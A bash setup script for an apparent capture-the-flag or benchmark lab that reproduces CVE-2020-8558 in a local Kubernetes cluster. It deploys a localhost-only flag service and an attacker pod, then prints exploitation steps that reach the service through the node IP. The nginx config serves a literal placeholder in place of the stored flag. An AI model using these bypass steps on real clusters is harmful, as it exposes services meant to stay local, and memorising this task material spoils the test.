#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-k8s-24-localhost-bypass"

FLAG="${CVE_FLAG:-flag{k8s-24-default}}"
FLAG_DIR="/home/kianabin/cve-flags/k8s-24"
mkdir -p "$FLAG_DIR"
echo "$FLAG" > "$FLAG_DIR/flag.txt"

echo "[K8S-24] CVE-2020-8558 kube-proxy Localhost Boundary Bypass"
echo "[*] Creating KIND cluster..."
kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"

echo "[*] Waiting for cluster stabilization..."
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true

echo "[*] Pre-loading container images into KIND..."
for img in alpine:latest nginx:1.24-alpine; do
  kind load docker-image $img --name "$CLUSTER_NAME" 2>/dev/null || true
done
sleep 10

echo "[*] Setting up node-localhost service with flag..."
# Deploy a pod with hostNetwork that listens on 127.0.0.1:11080
# This simulates a sensitive service bound only to localhost on the node
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Namespace
metadata:
  name: sensitive-ns
---
apiVersion: v1
kind: Pod
metadata:
  name: localhost-service
  namespace: sensitive-ns
spec:
  hostNetwork: true
  containers:
    - name: flag-server
      image: nginx:1.24-alpine
      imagePullPolicy: IfNotPresent
      command: ["sh", "-c"]
      args:
        - |
          # Serve flag only on 127.0.0.1:11080
          cat > /etc/nginx/conf.d/default.conf << 'NGINX'
          server {
            listen 127.0.0.1:11080;
            location /flag {
              return 200 'FLAG_CONTENT\n';
            }
          }
          NGINX
          nginx -g 'daemon off;'
      securityContext:
        privileged: false
---
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  namespace: default
spec:
  containers:
    - name: attacker
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
YAML

echo "[*] Waiting for pods..."
kubectl wait --for=condition=Ready pod/localhost-service -n sensitive-ns --timeout=60s 2>/dev/null || true
kubectl wait --for=condition=Ready pod/attacker --timeout=60s 2>/dev/null || true
sleep 5

# Get node IP for the attacker
NODE_IP=$(kubectl get node -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
echo ""
echo "[+] K8S-24 kube-proxy Localhost Bypass Ready"
echo "    Cluster: $CLUSTER_NAME"
echo "    Flag service: 127.0.0.1:11080 (node-localhost, not externally accessible)"
echo "    Node IP: $NODE_IP"
echo "    Flag: $FLAG"
echo ""
echo "    Exploitation steps:"
echo "    1. From the attacker pod, discover the node IP:"
echo "       kubectl exec attacker -- cat /etc/hosts | grep host"
echo "       # or via DNS: nslookup kubernetes.default.svc.cluster.local"
echo "    2. kube-proxy sets route_localnet=1, allowing pods to reach node's localhost"
echo "    3. Access the localhost-bound service via the node IP:"
echo "       kubectl exec attacker -- wget -qO- http://${NODE_IP}:11080/flag"
echo "    4. Without route_localnet, 127.0.0.1:11080 would only be reachable from the node itself"
echo ""
echo "    Note: CVE-2020-8558: kube-proxy sets net.ipv4.conf.all.route_localnet=1"
echo "    which allows adjacent hosts/pods to reach TCP/UDP services bound to 127.0.0.1 on nodes."